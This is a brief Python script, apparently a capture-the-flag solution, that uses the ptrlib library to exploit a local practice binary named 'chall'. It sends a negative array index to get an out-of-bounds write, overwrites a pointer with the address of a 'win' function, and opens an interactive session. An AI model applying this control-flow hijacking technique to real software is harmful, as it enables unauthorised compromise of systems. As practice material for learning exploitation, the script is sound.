from ptrlib import *


e = ELF("./chall")
p = Process("./chall")

idx = (0x404020 - 0x404080) // 0x8
p.sendlineafter('index: ', str(idx).encode() + b'\n' * 0x100)
p.sendlineafter('value: ', e.symbol('win'))

p.interactive()
